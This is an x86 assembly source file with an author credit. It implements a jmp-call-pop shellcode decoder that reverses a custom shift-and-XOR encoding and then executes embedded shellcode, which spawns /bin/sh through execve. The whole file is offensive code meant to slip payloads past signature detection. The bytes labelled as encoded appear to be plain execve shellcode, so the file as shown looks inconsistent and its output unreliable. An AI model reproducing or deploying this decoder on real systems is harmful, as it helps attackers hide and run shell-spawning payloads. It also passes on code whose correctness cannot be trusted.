; Author Tarek Talaat
; Email : unix.geek2014@gmail.com




;Note I added "\x99" as a marker of the end of the shellcode at the end.
;Make sure the marker doesn't exist in your shellcode already before adding it.

global _start

section .text

; Using Jump short pop technique
_start:
	jmp short call_shellcode


decoder:
	pop esi ; shellcode now loaded in esi and we will play with each byte.
		

decode:
	xor ebx, ebx
	xor eax, eax
	mov byte bl, [esi]    ; moving the first byte of esi to ebx
	xor bl, 0x99          ; We xor 0x99 to it first to check if we have reahced the end of the shellcode
	jz EncodedShell       ; If the result is zero we jump to the beginning of esi to run the decoded shellcode
	mov byte bl, [esi]    ; If it's not zero then we move the first byte again to ebx replacing any value there.
	mov al, bl            ; Get the same byte from ebx to eax this time.
	test al, al           ; We test now the last bit if it's "1" or not "check the encoder file for more details"
	js is_signed          ; If it's signed, then it means it has "1", then jump to is_signed
	shl al, 1             ; if it's not signed then the last bit is zero.
	xor al, 0xa3          ; Now we xor it with 0xa3
	mov [esi], al         ; move the final output back to esi
	inc esi               ; increment esi to move to the next byte
	
	jmp short decode

is_signed:
	btr ax, 7             ; we bit test the 7th bit if it's "0" we turn it into "1" and vise versa. In this case it's "1" we change it to "0"
	shl al, 1             ; After that we shift left the byte
	add al, 0x01          ; We add the lost "1" from the shift right operation in "Encoder" file
	xor al, 0xa3          ; Finally we xor it with 0xa3
	mov [esi], al         ; Then we move it to esi
	inc esi
	jmp decode            ; Go back to decode to repeat the process


call_shellcode:

	call decoder
	EncodedShell: db "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x99"
